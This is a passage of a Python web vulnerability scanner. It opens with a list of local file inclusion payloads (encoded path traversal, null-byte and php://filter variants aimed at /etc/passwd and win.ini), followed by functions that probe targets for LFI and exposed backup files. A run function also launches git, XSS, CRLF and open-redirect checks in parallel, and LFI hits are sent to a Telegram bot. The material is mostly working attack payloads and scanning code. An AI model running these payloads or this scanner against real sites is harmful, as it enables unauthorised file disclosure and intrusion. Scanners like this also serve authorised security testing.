    "/?q=../../../windows/win.ini%00&s=../../../windows/win.ini%00&search=../../../windows/win.ini%00&id=../../../windows/win.ini%00&action=../../../windows/win.ini%00&keyword=../../../windows/win.ini%00&query=../../../windows/win.ini%00&page=../../../windows/win.ini%00&keywords=../../../windows/win.ini%00&url=../../../windows/win.ini%00&view=../../../windows/win.ini%00&cat=../../../windows/win.ini%00&name=../../../windows/win.ini%00&key=../../../windows/win.ini%00&p=../../../windows/win.ini%00",
    "/?q=%252e%252e%252fetc%252fpasswd&s=%252e%252e%252fetc%252fpasswd&search=%252e%252e%252fetc%252fpasswd&id=%252e%252e%252fetc%252fpasswd&action=%252e%252e%252fetc%252fpasswd&keyword=%252e%252e%252fetc%252fpasswd&query=%252e%252e%252fetc%252fpasswd&page=%252e%252e%252fetc%252fpasswd&keywords=%252e%252e%252fetc%252fpasswd&url=%252e%252e%252fetc%252fpasswd&view=%252e%252e%252fetc%252fpasswd&cat=%252e%252e%252fetc%252fpasswd&name=%252e%252e%252fetc%252fpasswd&key=%252e%252e%252fetc%252fpasswd&p=%252e%252e%252fetc%252fpasswd",
    "/?q=%252e%252e%252fetc%252fpasswd%00&s=%252e%252e%252fetc%252fpasswd%00&search=%252e%252e%252fetc%252fpasswd%00&id=%252e%252e%252fetc%252fpasswd%00&action=%252e%252e%252fetc%252fpasswd%00&keyword=%252e%252e%252fetc%252fpasswd%00&query=%252e%252e%252fetc%252fpasswd%00&page=%252e%252e%252fetc%252fpasswd%00&keywords=%252e%252e%252fetc%252fpasswd%00&url=%252e%252e%252fetc%252fpasswd%00&view=%252e%252e%252fetc%252fpasswd%00&cat=%252e%252e%252fetc%252fpasswd%00&name=%252e%252e%252fetc%252fpasswd%00&key=%252e%252e%252fetc%252fpasswd%00&p=%252e%252e%252fetc%252fpasswd%00",
    "/?q=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&s=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&search=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&id=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&action=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&keyword=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&query=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&keywords=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&url=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&view=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&cat=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&name=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&key=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&p=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
    "/?q=....//....//windows/win.ini&s=....//....//windows/win.ini&search=....//....//windows/win.ini&id=....//....//windows/win.ini&action=....//....//windows/win.ini&keyword=....//....//windows/win.ini&query=....//....//windows/win.ini&page=....//....//windows/win.ini&keywords=....//....//windows/win.ini&url=....//....//windows/win.ini&view=....//....//windows/win.ini&cat=....//....//windows/win.ini&name=....//....//windows/win.ini&key=....//....//windows/win.ini&p=....//....//windows/win.ini",
    "/?q=..///////..////..//////windows/win.ini&s=..///////..////..//////windows/win.ini&search=..///////..////..//////windows/win.ini&id=..///////..////..//////windows/win.ini&action=..///////..////..//////windows/win.ini&keyword=..///////..////..//////windows/win.ini&query=..///////..////..//////windows/win.ini&page=..///////..////..//////windows/win.ini&keywords=..///////..////..//////windows/win.ini&url=..///////..////..//////windows/win.ini&view=..///////..////..//////windows/win.ini&cat=..///////..////..//////windows/win.ini&name=..///////..////..//////windows/win.ini&key=..///////..////..//////windows/win.ini&p=..///////..////..//////windows/win.ini",
    "/?q=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&s=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&search=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&id=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&action=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&keyword=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&query=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&keywords=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&url=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&view=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&cat=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&name=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&key=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&p=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini",
    "/?q=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&s=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&search=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&id=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&action=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&keyword=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&query=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&page=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&keywords=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&url=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&view=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&cat=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&name=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&key=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&p=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini",

    ]
    rg1="root:[x*]:0:0:"
    rg2="\\[(font|extension|file)s\\]"
    for x in pay:
        x=x.rstrip()
        url=i+x
        try:
            r = requests.head(url,verify=False)
            resp = r.content
            x1 = re.findall(rg1, str(resp))
            x2 = re.findall(rg2, str(resp))
            if (x1) or (x2):
                print('\033[91mPossibly LFI vulnerability\033[00m  '+url)
                msg="Possibly LFI vulnerability "+url
                bot.telegram_bot_sendtext(msg)
        except:
            pass

def backupfile_(i):
    filename=[]
    ext=['.tar','.rar','.zip','.tmp','.tar.gz','.sql.gz','.bak.sql','.bak.sql.gz', '.bak.sql.bz2','.bak.sql.tar.gz','.txt','.bak','.bak1','.bakup','.bakup1',  '.bkp','.save','.old','.orig','.original','.sql','.tpl','.tmp','.temp','.saved','.back','.bck','.bakup','.nsx','.cs','.csproj',
    '.vb','.0','.1','.2','.arc','.inc','.lst',]
    urls=[]
    def rev(str_):
        linth=len(str_)
        rs=''
        for x in range(linth+1):
            if x ==0:
                pass
            else:
                b=str_[-x]
                rs+=b
        return rs

    subdomainmame=i.split('/')[2]
    filename.append(subdomainmame)
    subdomnameMod1=subdomainmame.replace('.','_')
    filename.append(subdomnameMod1)
    subdomnameMod2=subdomainmame.replace('.','-')
    filename.append(subdomnameMod2)
    subdomnameMod3=subdomainmame.replace('.','')
    filename.append(subdomnameMod3)
    domainname_=rev(subdomainmame).split('.')[0]+'.'+rev(subdomainmame).split('.')[1]
    domainname=rev(domainname_)
    filename.append(domainname)
    domainnameMod1=domainname.replace('.','_')
    filename.append(domainnameMod1)
    domainnameMod2=domainname.replace('.','-')
    filename.append(domainnameMod2)
    domainnameMod3=domainname.replace('.','')
    filename.append(domainnameMod3)
    basename=domainname.split('.')[0]
    filename.append(basename)
    for x in filename:
        for p in ext:
            link1=i+'/'+x+p
            urls.append(link1)
    for b in  ext:
        link2=i+'/'+b
        urls.append(link2)
    try:
        testlink=i+'/uniq_StriNg'
        test_r = requests.head(testlink,verify=False)
        test_scode=test_r.status_code
    except:
          pass
    for url in urls:
        try:
            r = requests.head(url,verify=False)
            scode=r.status_code
            contentlength=r.headers.get('Content-Length')
            if '2' in str(scode) :
                if str(scode) != str(test_scode):
                    print("\033[94m[+] Possibly backup file disclosure :\033[00m  "+url)
        except:
            pass

def run(i):
    p1 = Process(target=git_, args=(i,),daemon=True)
    p1.start()
    
    p2 = Process(target=xss_, args=(i,),daemon=True)
    p2.start()
    
    p3 = Process(target=crlf_, args=(i,),daemon=True)
    p3.start()
    
    p4 = Process(target=openredaraction_, args=(i,),daemon=True)
    p4.start()
    
    p5 = Process(target=lfi_, args=(i,),daemon=True)
    p5.start()
    
    p6=Process(target=backupfile_, args=(i,),daemon=True)
    p6.start()
    

    p5.join()
    p4.join()
    p3.join()
    p1.join()
    p2.join()
    p6.join()

    

             


